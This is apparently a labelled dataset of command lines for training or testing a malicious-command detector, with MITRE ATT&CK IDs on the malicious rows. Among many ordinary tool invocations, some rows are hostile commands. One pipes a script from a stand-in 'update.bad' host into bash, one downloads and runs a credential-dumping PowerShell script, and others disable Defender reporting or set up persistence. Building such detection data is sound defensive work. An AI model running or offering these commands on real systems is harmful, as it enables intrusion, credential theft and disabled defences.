command,label,original_label,mitre_id
"find . -name ""*bsd*"" -print",Benign,Benign,Benign
qmmp --volume-inc|dec,Benign,Benign,Benign
koji subcommand [-h|--help],Benign,Benign,Benign
find . -size +4096k -print,Benign,Benign,Benign
HKLM\SOFTWARE\Plus,Malicious,Malicious,T1027
crontab -l -u www-data,Context_Dependent,Synthetic,Synthetic
"find /etc -name ""*.txt"" | xargs -I {} ls -l {}",Benign,Benign,Benign
who -a,Context_Dependent,Synthetic,Synthetic
"find . -type f -name ""*.pl"" -print0",Benign,Benign,Benign
gpgv path/to/file.asc,Benign,Benign,Benign
"git blame -L '/text/',+10 path/to/file",Benign,Benign,Benign
find lpi104-6 research/lpi104-6 -type l,Benign,Benign,Benign
transmission-create [-o|--outfile] path/to/example.torrent [-t|--tracker] tracker_url1 [-c|--comment] comment path/to/file_or_directory,Benign,Benign,Benign
find . -type d -maxdepth 1 -empty -print0 | xargs -0 /bin/rmdir,Benign,Benign,Benign
command | ts,Benign,Benign,Benign
topgrade --only operation,Benign,Benign,Benign
pip cache remove package_name,Benign,Benign,Benign
bacon,Benign,Benign,Benign
rbc.close();,Malicious,Malicious,T1105
pvs 2>/dev/null,Context_Dependent,Synthetic,Synthetic
openvpn3 sessions-list,Benign,Benign,Benign
fastmod --accept-all --print-changed-files --fixed-strings exact_string replacement,Benign,Benign,Benign
monodevelop,Benign,Benign,Benign
xmount --in raw path/to/image.dd --out dmg mountpoint,Benign,Benign,Benign
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},Malicious,Malicious,T1105
mongoimport --jsonArray --file path/to/file.json,Benign,Benign,Benign
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,Malicious,Malicious,T1562
ipcs -c,Benign,Benign,Benign
terraform apply -destroy,Benign,Benign,Benign
WNetEnumResourceW,Context_Dependent,Malicious,T1135
pw-jack -h,Benign,Benign,Benign
bitwise 0x563d,Benign,Benign,Benign
pnmnorm -luminosity|colorvalue|saturation path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
.config,Malicious,Malicious,T1574
"find . -name ""*.pdf"" -exec rm {} \;",Benign,Benign,Benign
airport --scan,Benign,Benign,Benign
luanti --gameid list,Benign,Benign,Benign
wpm --stats,Benign,Benign,Benign
"rsync -ave ssh '""Louis Theroux""''""'""'""'""''""s LA Stories""'",Benign,Benign,Benign
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*,Malicious,Malicious,T1003
"find -name ""*.htm"" -print",Benign,Benign,Benign
unimatrix --color red|green|blue|white|...,Benign,Benign,Benign
mkdir tata,Benign,Benign,Benign
find -inum 804180 -exec rm {} \,Benign,Benign,Benign
"CONFIG -set ""cpu cycles=10000""",Benign,Benign,Benign
sdcv --use-dict dictionary_name search_term,Benign,Benign,Benign
searchsploit --nmap path/to/nmap-output.xml,Benign,Benign,Benign
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",Malicious,Malicious,T1564
caja [-g|--geometry] 600x400 path/to/directory,Benign,Benign,Benign
query process session_name|user_name,Benign,Benign,Benign
kreadconfig5 --file path/to/file --group group_name --key key_name,Benign,Benign,Benign
dd if=path/to/file.iso of=/dev/usb_drive status=progress,Benign,Benign,Benign
System.Windows.Forms.Clipboard.GetText(),Malicious,Malicious,T1115
pio team update --description new_description organization_name:team_name,Benign,Benign,Benign
s [-p|--provider] provider query,Benign,Benign,Benign
vpnd,Benign,Benign,Benign
ssh -J jumphost user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
git guilt first_revision last_revision,Benign,Benign,Benign
DumpNTLMInfo.py -port port target,Benign,Benign,Benign
gummy [-s|--screen] 1 [-t|--temperature] 3800 [-b|--brightness] 65,Benign,Benign,Benign
column -t -s $'\n' list-of-entries.txt,Benign,Benign,Benign
supervisorctl tail -100 process_name stderr,Benign,Benign,Benign
llm keys set openai,Benign,Benign,Benign
hledger-ui [-h|--help],Benign,Benign,Benign
mdp [-i|--invert] presentation.md,Benign,Benign,Benign
fossil [rm|delete] path/to/file_or_directory,Benign,Benign,Benign
jj git remote list,Benign,Benign,Benign
unflatten -?,Benign,Benign,Benign
gdebi path/to/package.deb [-o|--option] APT_OPTS,Benign,Benign,Benign
systemctl try-reload-or-restart unit1 unit2 ...,Benign,Benign,Benign
"find . -type f -iname ""*.flac"" -o -print0 -iname ""*.mp3"" -print0 -o -iname ""*.wav"" -print0 -o -iname ""*.aac"" -print0 -o -iname ""*.wma"" -print0 | while read -d $'\0' file; do cp -ruv ""$file"" ""/media/wd/network_sync/music/$file""; done",Benign,Benign,Benign
setfacl [-b|--remove-all] path/to/file_or_directory,Benign,Benign,Benign
qm start 100 --machine q35,Benign,Benign,Benign
%PROGRAMFILES%,Malicious,Malicious,T1547
fprintd-verify,Benign,Benign,Benign
tailscale up --accept-dns=false,Benign,Benign,Benign
"kdialog --warningyesnocancel ""message""",Benign,Benign,Benign
presenterm path/to/slides.md,Benign,Benign,Benign
jj abandon --restore-descendants revsets,Benign,Benign,Benign
yadm clone remote_repository_location --w worktree_file,Benign,Benign,Benign
wikit topic [-l|--lang] language_code,Benign,Benign,Benign
telnet localhost port_number,Benign,Benign,Benign
subl path/to/file_or_directory,Benign,Benign,Benign
ndc -t command,Benign,Benign,Benign
doskey /macros > path\to\macinit_file,Benign,Benign,Benign
host ip_address,Benign,Benign,Benign
"echo -e ""line1\r\nline2"" | awk '{ print $0; }' | od -a",Benign,Benign,Benign
josm --language de,Benign,Benign,Benign
VBoxManage controlvm uuid|vm_name shutdown,Benign,Benign,Benign
tlmgr restore package,Benign,Benign,Benign
"find . -name ""*"" -exec chgrp -v new_group '{}' \; -exec chmod -v 770 '{}' \;",Benign,Benign,Benign
ssh-keygen -D /path/to/lib.so,Malicious,Malicious,T1574
mshta.exe {REMOTEURL},Malicious,Malicious,T1105
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),Malicious,Malicious,T1555
systemctl list-paths --state state,Benign,Benign,Benign
pw-cat [-r|--record] [-m|--midi] path/to/file.mid,Benign,Benign,Benign
igfxem.exe,Malicious,Malicious,T1574
md5 path/to/file,Benign,Benign,Benign
gitui [-t|--theme] theme2.ron,Benign,Benign,Benign
dig target.com,Context_Dependent,Synthetic,Synthetic
git rebase --skip,Benign,Benign,Benign
zerotier-idtool generate path/to/identity.secret path/to/identity.public vanity_prefix,Benign,Benign,Benign
boot jar,Benign,Benign,Benign
glab mr merge [-d|--remove-source-branch],Benign,Benign,Benign
"echo -e 'y\n'|ssh-keygen -q -t rsa -N """" -f ~/.ssh/id_rsa",Benign,Benign,Benign
ptrace,Context_Dependent,Malicious,T1622
find /srv -name '*.pem' -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
find /directory -newermt $(date +%Y-%m-%d -d '1 day ago') -type f -print,Benign,Benign,Benign
nping --udp example.com,Benign,Benign,Benign
gdb --args path/to/executable argument1 argument2 ...,Benign,Benign,Benign
startx /path/to/window_manager_or_desktop_environment,Benign,Benign,Benign
nop -?,Benign,Benign,Benign
find * -maxdepth 0 ! -path . -exec mv {} PRE_{} \;,Benign,Benign,Benign
"join -t, -o 1.1,1.2,2.3 -a1 in1 in2",Benign,Benign,Benign
sudo chmod +x /etc/rc.local,Malicious,Malicious,T1037
shopt -u compat31,Benign,Benign,Benign
opencode debug scrap,Benign,Benign,Benign
hlint path/to/file --refactor,Benign,Benign,Benign
"todoist [q|quick] '#project_name ""tmr 9am"" p1 task_name @label_name'",Benign,Benign,Benign
pr [-m|--merge] [-T|--omit-pagination] path/to/file1 path/to/file2 ...,Benign,Benign,Benign
find \! -name . -type d -print0 | xargs -0 rmdir,Benign,Benign,Benign
systemctl add-wants target unit1 unit2 ...,Benign,Benign,Benign
catimg -w|-H 40 path/to/file,Benign,Benign,Benign
eject [-r|--cdrom] /dev/cdrom,Benign,Benign,Benign
"Get-ChildItem ""$file_path"" | % { $_.LastAccessTime = ""$target_date_time"" }",Malicious,Malicious,T1070
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/hostname,Context_Dependent,Synthetic,Synthetic
pageres https://example.com/ 1366x768 --hide='.page-header',Benign,Benign,Benign
gzip [-cd|--stdout --decompress] path/to/file.gz > path/to/uncompressed_file,Benign,Benign,Benign
testssl --starttls ftp|smtp|pop3|imap|xmpp|sieve|xmpp-server|telnet|ldap|irc|lmtp|nntp|postgres|mysql example.com:port,Benign,Benign,Benign
mupdf -r 72 path/to/file,Benign,Benign,Benign
mmcli --list-modems,Benign,Benign,Benign
printf 'exit 0' | sudo tee -a /etc/rc.local,Malicious,Malicious,T1037
pnmcrop -bg-corner topleft|topright|bottomleft|bottomright path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
django-admin startproject project_name,Benign,Benign,Benign
"wrk [-t|--threads] 2 [-c|--connections] 5 [-d|--duration] 5s --timeout 2s ""http://example.com/index.html""",Benign,Benign,Benign
"sudo apptainer capability add [-g|--group] groupname cap_net_raw,cap_chown,...",Benign,Benign,Benign
pulumi up,Benign,Benign,Benign
"find kat -type f \( -name ""*~"" -p -name ""*.bak"" \) -delete",Benign,Benign,Benign
macptopbm [-q|-quiet] > path/to/output.pbm,Benign,Benign,Benign
polybar --config=path/to/config.ini bar_name,Benign,Benign,Benign
chown -R www-data /var/www/.gnome2 /var/www/.config /var/www/.config/inkscape,Benign,Benign,Benign
astronomer tldr-pages/tldr-node-client [-s|--stars] 50,Benign,Benign,Benign
leave time_to_leave,Benign,Benign,Benign
vt domain ip_address,Benign,Benign,Benign
pueue reset [-f|--force],Benign,Benign,Benign
"rm -fR ""${TMP}/"";",Benign,Benign,Benign
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f,Malicious,Malicious,T1053
sudo rtcwake [-m|--mode] show [-v|--verbose],Benign,Benign,Benign
p4 submit -c changelist_number,Benign,Benign,Benign
"find ""$GIVEN_DIR"" -type d -mindepth 1 -print0",Benign,Benign,Benign
find . -size 10 print,Benign,Benign,Benign
rawtoppm width height path/to/image.raw > path/to/output.ppm,Benign,Benign,Benign
md $folder_name,Malicious,Malicious,T1564
choom [-p|--pid] pid [-n|--adjust] -1000..+1000,Benign,Benign,Benign
virt-qemu-run [-r|--root] path/to/directory path/to/guest.xml,Benign,Benign,Benign
sleep 1d 3h,Benign,Benign,Benign
pg_waldump start_segment,Benign,Benign,Benign
"dbt build --exclude ""tag:not_now""",Benign,Benign,Benign
pg_basebackup [-h|--host] host [-D|--pgdata] path/to/backup_dir [-P|--progress],Benign,Benign,Benign
tldr jira project,Benign,Benign,Benign
find . -type f -print0 | xargs -0 -n1 -P4 bzip2,Benign,Benign,Benign
rpicam-jpeg [-o|--output] path/to/file.jpg --width 1920 --height 1080,Benign,Benign,Benign
hash -r,Benign,Benign,Benign
sudo arptables [-A|--append] INPUT [-s|--source-ip] 192.168.0.1 [-j|--jump] DROP,Benign,Benign,Benign
sfdk qmltypes,Benign,Benign,Benign
cython --cplus path/to/file,Benign,Benign,Benign
pg_ctl [-D|--pgdata] data_directory restart,Benign,Benign,Benign
$conn.bind(),Malicious,Malicious,T1110
zsync -i path/to/existing_file path/to/url.zsync,Benign,Benign,Benign
geth account new,Benign,Benign,Benign
envsubst < path/to/input_file > path/to/output_file,Benign,Benign,Benign
ifconfig en0 | grep -Eo ..\(\:..\){5},Context_Dependent,Benign,Benign
pipewire --config path/to/file.conf,Benign,Benign,Benign
git restore path/to/file,Benign,Benign,Benign
"find / -type f -name ""*"" -newermt ""$newerthan"" ! -newermt ""$olderthan"" -ls",Context_Dependent,Benign,Benign
reflector [-c|--country] Germany [-p|--protocol] https,Benign,Benign,Benign
xpdf -fullscreen path/to/file.pdf,Benign,Benign,Benign
pokego --name blastoise --form mega,Benign,Benign,Benign
nala purge package,Benign,Benign,Benign
seq 0 20 | xargs -n1 tssh MYBOXES,Benign,Benign,Benign
fail2ban-client ping,Benign,Benign,Benign
steamos-session-select plasma-wayland-persistent,Benign,Benign,Benign
qgis_process --skip-loading-plugins run algorithm_id --PARAMETER1=value1 --PARAMETER2=value2 ...,Benign,Benign,Benign
"watch ""ls /proc/$PYTHONPID/fd | wc -l""",Benign,Benign,Benign
solcjs --bin --base-path path/to/directory path/to/file.sol,Benign,Benign,Benign
curl http://update.bad/shell.sh | bash,Malicious,Synthetic,Synthetic
isoinfo -i path/to/image.iso -x /PATH/TO/FILE/INSIDE/ISO.EXT,Benign,Benign,Benign
apt-key list,Benign,Benign,Benign
resolvconf --updates-are-enabled,Benign,Benign,Benign
ifconfig eth0 | grep inet | cut -d: -f2 | cut -d' ' -f1,Context_Dependent,Benign,Benign
lxc profile edit profile_name,Benign,Benign,Benign
sudo gpm -m path/to/mouse_device -t mouse_type -R,Benign,Benign,Benign
assimp listexport,Benign,Benign,Benign
hangups,Benign,Benign,Benign
http-server path/to/directory [-p|--port] port,Benign,Benign,Benign
cliphist list,Benign,Benign,Benign
vncserver,Benign,Benign,Benign
unrar t compressed.rar,Benign,Benign,Benign
"rundll32.exe zipfldr.dll,RouteTheCall ""$exe_to_launch""",Malicious,Malicious,T1218
history -r /path/to/input-file,Context_Dependent,Malicious,T1005
aws iam list-roles,Context_Dependent,Malicious,T1087
alr init --bin|--lib project_name,Benign,Benign,Benign
find . -maxdepth 2 -size +100000 -exec bzip2 {} \;,Benign,Benign,Benign
"oneliner [-r|--run] ""list files larger than 1GB""",Benign,Benign,Benign
uuencode -o path/to/output_file path/to/input_file output_file_name_after_decoding,Benign,Benign,Benign
sfdp -T png -O path/to/input.gv,Benign,Benign,Benign
"echo -e ""\n/usr/local/boost_1_54_0/stage/lib"" | sudo tee -a /etc/ld.so.conf",Benign,Benign,Benign
pio system prune,Benign,Benign,Benign
/var/logs,Malicious,Malicious,T1070
xctool -project YourProject.xcodeproj -scheme YourScheme build,Benign,Benign,Benign
dropdb [-i|--interactive] database_name,Benign,Benign,Benign
"inotifywait [-m|--monitor] [-r|--recursive] --exclude ""regex"" path/to/directory",Benign,Benign,Benign
"find . -type f -newermt ""Aug 10"" ! -newermt ""Aug 17"" -exec rm {} \;",Benign,Benign,Benign
file -f /path/to/input-file,Context_Dependent,Malicious,T1005
stylua - < path/to/file.lua,Benign,Benign,Benign
quarkus deploy kubernetes,Benign,Benign,Benign
jmap -histo java_pid,Benign,Benign,Benign
find ./ -type f -name \*.php -exec sed -i ’s/^.*iframe bla bla bla.*$//g’ {} \;,Benign,Benign,Benign
export VARIABLE=value,Benign,Benign,Benign
pg_isready [-q|--quiet],Benign,Benign,Benign
Set-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment,Context_Dependent,Malicious,T1526
nrm use registry,Benign,Benign,Benign
find . -name .DS_Store -exec git rm --ignore-unmatch --cached {} +,Benign,Benign,Benign
kubeadm upgrade plan,Benign,Benign,Benign
chown -R tomcat7:tomcat7 webapps temp logs work conf,Benign,Benign,Benign
(find $DIR/tmp/daily/ -name *.tar.gz | sort -n | head -2,Benign,Benign,Benign
cargo owner [-a|--add] username|github:org_name:team_name crate,Benign,Benign,Benign
busybox cat,Malicious,Malicious,T1548
git diff-tree tree-ish1 tree-ish2,Benign,Benign,Benign
"find $target -type f -iname ""*.txt""",Benign,Benign,Benign
sleep `10`,Benign,Benign,Benign
sudo bcachefs data rereplicate path/to/mountpoint,Benign,Benign,Benign
kiterunner kb convert path/to/wordlist.kite path/to/wordlist.json,Benign,Benign,Benign
tcpdump -i ens160 -w /tmp/capture.pcap,Context_Dependent,Synthetic,Synthetic
meshnamed -getname 200:6fc8:9220:f400:5cc2:305a:4ac6:967e,Benign,Benign,Benign
SecKeychainItemCopyAttributesAndData,Malicious,Malicious,T1555
"wmic /Node:localhost /Namespace:\\root\Microsoft\Windows\Defender Path MSFT_MpPreference Get /format:list | findstr /i /C:""DisableRealtimeMonitoring"" /C:""ExclusionPath"" /C:""ExclusionExtension"" /C:""ExclusionProcess""",Context_Dependent,Malicious,T1518
guacd -b 127.0.0.1 -l 4823,Benign,Benign,Benign
gh auth refresh,Benign,Benign,Benign
find /home -writable -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
sgpt --help,Benign,Benign,Benign
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f,Malicious,Malicious,T1112
find /home/mywebsite/public_html/sites/all/modules -type d -exec chmod 750 {} +,Context_Dependent,Benign,Benign
Security Settings\Local Policies\Audit Policy,Malicious,Malicious,T1562
git imerge diagram,Benign,Benign,Benign
cat /proc/2/status,Context_Dependent,Synthetic,Synthetic
sudo trip example.com --protocol udp --source-port 5000,Benign,Benign,Benign
apropos disk,Benign,Benign,Benign
sudo pueue completions fish /usr/share/fish/completions,Benign,Benign,Benign
find . -name 'some_text_2014.08.19*',Benign,Benign,Benign
"SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR ""[path to self]"" /ST 10:00",Malicious,Malicious,T1053
"find /usr/src -not \( -name ""*,v"" -o -name "".*,v"" \) '{}' \; -print",Benign,Benign,Benign
doctum parse,Benign,Benign,Benign
certtool [-s|--generate-self-signed] --load-privkey path/to/ca.key --template path/to/ca.template --outfile path/to/ca.crt,Benign,Benign,Benign
"find / -iname ""*.mp3"" -type f | xargs -I '{}' mv {} /mnt/mp3",Context_Dependent,Benign,Benign
moe [-B|--no-backup] path/to/file,Benign,Benign,Benign
carbonyl https://example.com,Benign,Benign,Benign
cp -Rvn /source/path/* /destination/path/,Benign,Benign,Benign
echo T1222.001_attrib2 >> $file_or_folder\T1222.001_attrib2.txt,Malicious,Malicious,T1222
find . -type d -name .svn -prune -o -print,Benign,Benign,Benign
waypipe ssh user@server,Benign,Benign,Benign
tmt run [-a|--all] provision [-h|--how] container [-i|--image] fedora:rawhide,Benign,Benign,Benign
